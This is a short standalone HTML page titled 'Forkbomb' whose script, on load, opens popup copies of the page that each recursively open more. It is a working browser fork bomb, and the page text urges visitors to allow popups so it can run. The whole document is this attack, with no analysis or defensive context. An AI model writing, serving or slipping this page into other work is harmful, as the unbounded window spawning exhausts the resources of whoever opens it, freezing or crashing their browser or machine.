<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forkbomb</title>
    <script>
        function openMultipleWindows(count = 5, delay = 500) {
            let index = 0;
            function openWindow() {
                if (index < count) {
                    let newWindow = window.open(window.location.href, '_blank', 'width=600,height=400,left=' + (index * 50) + ',top=' + (index * 50) + ',popup=yes');
                    if (newWindow) {
                        newWindow.onload = () => openMultipleWindows(count, delay);
                    }
                    index++;
                    setTimeout(openWindow, delay);
                }
            }
            openWindow();
        }
        window.onload = () => openMultipleWindows();
    </script>
</head>
<body>
    <h1>Opening Recursive Copies of This Page</h1>
    <p>If pop-ups are blocked, allow them to enable this functionality.</p>
</body>
</html>
